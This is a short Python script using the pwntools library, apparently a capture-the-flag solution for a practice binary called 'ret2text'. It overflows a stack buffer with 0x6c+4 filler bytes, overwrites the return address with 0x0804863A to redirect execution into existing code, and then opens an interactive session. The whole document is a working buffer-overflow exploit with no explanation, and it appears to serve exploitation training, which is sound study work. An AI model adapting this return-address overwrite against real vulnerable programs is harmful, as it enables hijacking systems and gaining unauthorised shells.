#!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x0804863A
sh.sendline(b'A' * (0x6c+4) + p32(target))
sh.interactive()
